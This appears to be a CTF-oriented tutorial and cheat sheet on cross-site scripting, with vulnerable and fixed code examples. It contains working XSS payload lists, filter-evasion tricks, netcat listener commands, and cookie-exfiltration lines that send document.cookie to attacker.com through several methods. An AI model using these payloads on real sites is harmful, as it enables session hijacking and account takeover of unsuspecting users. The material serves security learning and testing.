# XSS — Cross-Site Scripting Basics

---

## Quick Reference

| Type | Where payload lives | Persists? | Victim |
|------|-------------------|-----------|--------|
| Reflected | URL / request parameter | No | Anyone who clicks the link |
| Stored | Database / server storage | Yes | Every user who views the page |
| DOM-based | Client-side JS processes URL | No | Anyone who visits crafted URL |

```html
<!-- Fastest confirmation payloads — try in order -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"onmouseover="alert(1)
javascript:alert(1)
{{7*7}}
```

---

## What is XSS? 🔓

XSS happens when an attacker injects malicious JavaScript into a web page that other users view. The browser executes the script in the **victim's session context** — with full access to their cookies, localStorage, DOM, and the ability to make requests as them.

**Impact:**
- 🔴 Session hijacking — steal `document.cookie` and take over accounts
- 🔴 Credential theft — inject fake login forms, capture keystrokes
- 🔴 Account takeover — change email/password via fetch() in victim's session
- 🔴 Malware distribution — redirect victims to exploit kits
- 🔴 Defacement — modify page content for all visitors (stored XSS)
- ⚠️ Impact scales with where the XSS fires — admin panel XSS is critical

**The core idea:**

```
Normal flow:
Server sends HTML → Browser renders it → User sees the page

XSS flow:
Server sends HTML + attacker's <script> → Browser executes script
→ Script runs in victim's origin → Same-origin policy bypassed
→ Attacker controls the victim's browser session
```

---

## The Three Types

### Reflected XSS

The payload travels in the **request** (URL parameter, form field, header) and is immediately reflected back in the response. No storage — the victim must be tricked into sending the crafted request.

```
Attack chain:
1. Attacker crafts URL: https://site.com/search?q=<script>alert(1)</script>
2. Attacker sends link to victim (email, chat, QR code)
3. Victim clicks → browser sends request with payload in URL
4. Server reflects payload into HTML response
5. Browser executes attacker's script in victim's session
```

```http
-- Typical reflected XSS request:
GET /search?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>
Host: vulnerable.com

-- Server response:
<p>Results for: <script>document.location='https://attacker.com/?c='+document.cookie</script></p>
```

### Stored XSS

The payload is **saved to the server** (database, file, log) and executed every time the stored content is displayed. No need to trick individual victims into clicking — the payload fires automatically.

```
Attack chain:
1. Attacker submits payload in a comment, profile, message, etc.
2. Server saves payload to database
3. Any user who views the page gets the script served to them
4. Script executes in every victim's session automatically
```

```html
<!-- Stored in a comment field: -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

<!-- Every user who loads the comments page executes this -->
```

### DOM-Based XSS

The payload never reaches the server — it's processed entirely by **client-side JavaScript** that reads from an attacker-controlled source (`location.hash`, `location.search`, `document.referrer`) and writes to a dangerous sink (`innerHTML`, `eval`, `document.write`).

```javascript
// Vulnerable code — reads from URL hash, writes to DOM
const search = location.hash.substring(1);  // reads #payload
document.getElementById('result').innerHTML = search;  // writes unsanitized

// Attack URL:
// https://site.com/page#<img src=x onerror=alert(1)>
// Server never sees the payload (# fragment not sent)
// Browser processes it client-side → XSS fires
```

**Common DOM XSS sources:**
```javascript
location.hash
location.search
location.href
document.referrer
window.name
postMessage data
localStorage / sessionStorage (if attacker can write)
```

**Common DOM XSS sinks:**
```javascript
innerHTML         // ← most common
outerHTML
document.write()
document.writeln()
eval()
setTimeout(string)    // setTimeout("alert(1)", 0)
setInterval(string)
new Function(string)
location.href = "javascript:..."
element.src = "javascript:..."
```

---

## Detecting XSS

### Step 1 — Find Reflection Points

Inject a unique string and search the response:

```
Input: xsstest1234
Look for it in:
- Page body
- HTML attributes (value="xsstest1234")
- JavaScript variables (var x = "xsstest1234")
- URL values (href="...xsstest1234...")
- CSS (style="...xsstest1234...")
```

### Step 2 — Identify the Context

Where your input lands determines which payload works:

```html
<!-- Context 1: Raw HTML body -->
<p>Hello xsstest1234</p>
→ Use: <script>alert(1)</script> or <img src=x onerror=alert(1)>

<!-- Context 2: HTML attribute value (double-quoted) -->
<input value="xsstest1234">
→ Use: "><script>alert(1)</script>  or  " onmouseover="alert(1)

<!-- Context 3: HTML attribute value (single-quoted) -->
<input value='xsstest1234'>
→ Use: '><script>alert(1)</script>  or  ' onmouseover='alert(1)

<!-- Context 4: HTML attribute (unquoted) -->
<input value=xsstest1234>
→ Use: xsstest1234 onmouseover=alert(1)  or  xsstest1234><script>alert(1)</script>

<!-- Context 5: JavaScript string (double-quoted) -->
<script>var x = "xsstest1234";</script>
→ Use: ";alert(1);//  or  "-alert(1)-"

<!-- Context 6: JavaScript string (single-quoted) -->
<script>var x = 'xsstest1234';</script>
→ Use: ';alert(1);//  or  '-alert(1)-'

<!-- Context 7: JavaScript template literal -->
<script>var x = `xsstest1234`;</script>
→ Use: ${alert(1)}

<!-- Context 8: URL attribute -->
<a href="xsstest1234">click</a>
→ Use: javascript:alert(1)

<!-- Context 9: CSS context -->
<style>body { color: xsstest1234; }</style>
→ Use: red}</style><script>alert(1)</script>
```

### Step 3 — Test Payloads

```html
<!-- Start with the simplest, escalate if blocked -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<details open ontoggle=alert(1)>
```

### Step 4 — Confirm Execution

Replace `alert(1)` with something visible that proves execution:

```javascript
// Visual confirmation
alert(document.domain)      // shows which domain executed the script
alert(document.cookie)      // shows cookies (confirms access)
console.log(1)              // check browser console
document.title = "XSS"     // visible page change
```

---

## Context-Aware Payloads

### HTML Body Context

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<object data="javascript:alert(1)">
```

### HTML Attribute Context

```html
<!-- Breaking out of double quotes -->
"><script>alert(1)</script>
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onload="alert(1)

<!-- Breaking out of single quotes -->
'><script>alert(1)</script>
' onmouseover='alert(1)

<!-- Breaking out of unquoted attribute -->
onmouseover=alert(1) x=
><script>alert(1)</script>

<!-- Event handlers that fire without interaction -->
" autofocus onfocus="alert(1)
" onload="alert(1)         ← only works on body/iframe/img
```

### JavaScript String Context

```javascript
// Breaking out of double-quoted string
";alert(1);//
"-alert(1)-"
\";alert(1);//

// Breaking out of single-quoted string
';alert(1);//
'-alert(1)-'
\';alert(1);//

// Template literal
${alert(1)}
`${alert(1)}`

// Inside JS without breaking string — using string operations
"+alert(1)+"
'+alert(1)+'

// If semicolons are blocked
"\nalert(1)\n"
"-alert(1)-"
```

### URL / href Context

```html
javascript:alert(1)
javascript:alert(document.cookie)
JaVaScRiPt:alert(1)
javascript&#58;alert(1)
&#106;avascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### CSS Context

```css
red}</style><script>alert(1)</script>
expression(alert(1))        /* IE only */
</style><script>alert(1)</script>
```

---

## Stealing Cookies

The classic XSS payload — exfiltrate session cookies to take over accounts.

```javascript
// Method 1 — image beacon (simplest)
new Image().src = 'https://attacker.com/steal?c=' + document.cookie;

// Method 2 — fetch (modern, more reliable)
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));

// Method 3 — location redirect (victim sees it)
document.location = 'https://attacker.com/steal?c=' + document.cookie;

// Method 4 — XHR
var x = new XMLHttpRequest();
x.open('GET', 'https://attacker.com/steal?c=' + document.cookie);
x.send();

// In a payload (no spaces version):
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">

// URL-safe version (for reflected XSS in URL):
<script>new Image().src='//attacker.com/?c='+btoa(document.cookie)</script>
```

**Setting up a listener:**

```bash
# Netcat listener (simple)
nc -lvnp 80

# Python HTTP server
python3 -m http.server 80

# Burp Collaborator (best for CTFs — logs DNS + HTTP)
# Use: YOUR-ID.burpcollaborator.net

# webhook.site (easiest)
# Use: https://webhook.site/YOUR-UUID
```

---

## DOM XSS Hunting

### Finding Vulnerable Sources and Sinks

```javascript
// Search JS files for dangerous sinks:
innerHTML
outerHTML
document.write
eval(
setTimeout(
setInterval(
location.href
location =
location.replace(
window.open(

// Search for sources being read:
location.hash
location.search
location.href
document.referrer
window.name
URLSearchParams
```

### Manual DOM XSS Testing

```javascript
// In browser console — test if source reaches sink:

// Test location.hash → innerHTML
document.getElementById('result').innerHTML = location.hash;
// Set URL to: #<img src=x onerror=alert(1)>

// Test location.search → eval
eval(new URLSearchParams(location.search).get('code'));
// Set URL to: ?code=alert(1)

// Test postMessage → innerHTML
window.addEventListener('message', e => {
    document.getElementById('content').innerHTML = e.data;
});
// In console: window.postMessage('<img src=x onerror=alert(1)>', '*')
```

### DOM XSS via URL Fragment

```
// Payload in URL hash (never sent to server):
https://site.com/page#<img src=x onerror=alert(1)>
https://site.com/page#<svg onload=alert(1)>
https://site.com/page#javascript:alert(1)

// Encoded (if hash is decoded by JS):
https://site.com/page#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

---

## XSS Without alert()

Many CTF challenges and WAFs block `alert`. Use alternatives:

```javascript
// Alternatives to alert()
confirm(1)
prompt(1)
console.log(1)
print()                    // opens print dialog
document.title=1           // visible change
document.body.innerHTML=1  // visible change

// Alternatives when parentheses are blocked
alert`1`                   // tagged template literal
alert.call(null,1)
alert.apply(null,[1])
[1].find(alert)
window['alert'](1)
(alert)(1)

// Alternatives when alert is keyword-filtered
top['al'+'ert'](1)
window['\x61\x6c\x65\x72\x74'](1)   // hex encoded
eval('ale'+'rt(1)')
setTimeout('alert(1)')
```

---

## Exploitation Workflow

1. **Find all input points** — URL params, form fields, headers, cookies, JSON body, file names
2. **Inject unique string** — `xsstest1234` and search response for it
3. **Identify context** — where does your string appear? HTML body, attribute, JS, URL, CSS?
4. **Check encoding** — are `<`, `>`, `"`, `'`, `/` encoded? Which ones?
5. **Pick context-appropriate payload** — HTML body → `<script>`, attribute → break out with `"`, JS string → `';`
6. **Test basic payload** — `<img src=x onerror=alert(1)>` — does it fire?
7. **Confirm execution** — `alert(document.domain)` to confirm origin
8. **Escalate** — swap `alert()` for cookie theft or account takeover payload
9. **Deliver** — for reflected: craft URL; for DOM: craft URL with hash/param; for stored: submit payload to form

---

## Common Vulnerable Patterns

**Reflected — unsanitized output in HTML:**

```python
# ❌ Vulnerable — user input directly in template
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<p>Results for: {query}</p>"   # ← raw input in HTML

# ✅ Fixed
from markupsafe import escape
return f"<p>Results for: {escape(query)}</p>"
```

**Stored — unsanitized content saved and rendered:**

```javascript
// ❌ Vulnerable — saves raw input, renders with innerHTML
app.post('/comment', (req, res) => {
    db.comments.insert({ text: req.body.comment });  // raw save
});

// Frontend:
div.innerHTML = comment.text;   // ← raw render → XSS

// ✅ Fixed
div.textContent = comment.text;  // textContent never executes scripts
```

**DOM — source to sink without sanitization:**

```javascript
// ❌ Vulnerable — URL param → innerHTML
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello ' + name;

// ✅ Fixed
document.getElementById('greeting').textContent = 'Hello ' + name;
// OR sanitize with DOMPurify:
document.getElementById('greeting').innerHTML = DOMPurify.sanitize('Hello ' + name);
```

**Attribute — unquoted or improperly quoted:**

```html
<!-- ❌ Vulnerable — unquoted attribute -->
<img src=<?= $_GET['img'] ?>>
<!-- Input: x onerror=alert(1) → <img src=x onerror=alert(1)> -->

<!-- ✅ Fixed — quoted + escaped -->
<img src="<?= htmlspecialchars($_GET['img'], ENT_QUOTES) ?>">
```

---

## CTF & Practical Tips

**Fastest initial checks:**

```html
<!-- Paste these one by one into every input field: -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"onmouseover="alert(1)
'>"><img src=x onerror=alert(1)>
javascript:alert(1)
```

**Speed tips:**
- ✅ Check the page source after injection — find exactly where your input lands before picking a payload
- ✅ `<img src=x onerror=alert(1)>` works in more contexts than `<script>` — try it first
- ✅ DOM XSS: check the URL hash (`#`) — many CTF pages read it with `innerHTML`
- ✅ Stored XSS: submit payload in every field — username, bio, comment, title, address
- ✅ If `alert` is blocked → `confirm(1)` or `alert\`1\`` (backtick syntax)
- ⚠️ `<script>` tags injected via `innerHTML` do NOT execute — use `<img onerror>` or `<svg onload>` instead
- ⚠️ `HttpOnly` cookies can't be stolen via `document.cookie` — pivot to session actions instead (fetch API calls)
- ⚠️ Check if there's a CSP header in the response — if yes, see `xss-advanced.md`

**Common CTF scenarios:**
- **Search box reflects input** → reflected XSS, `<img src=x onerror=alert(1)>`
- **Comment / feedback form** → stored XSS, fire on every visitor
- **URL hash used in page** → DOM XSS, `#<svg onload=alert(1)>`
- **Profile name displayed** → stored XSS with user context
- **"Report to admin" feature** → XSS fires on admin → steal their cookie → admin takeover
- **`name` param in JS `innerHTML`** → DOM XSS, check source for sink

---

## Key Takeaways

- ✅ XSS has 3 types — reflected (URL), stored (database), DOM (client-side JS) — each needs different delivery
- ✅ Context is everything — identify WHERE your input lands before picking a payload
- ✅ `<img src=x onerror=alert(1)>` is the most universal payload — works in HTML body and many attribute contexts
- ✅ `<script>` injected via `innerHTML` never executes — always use event handler payloads for DOM injection
- ✅ `HttpOnly` blocks `document.cookie` — escalate to fetch-based account takeover instead
- ✅ DOM XSS never reaches the server — test by manipulating the URL hash and watching the page change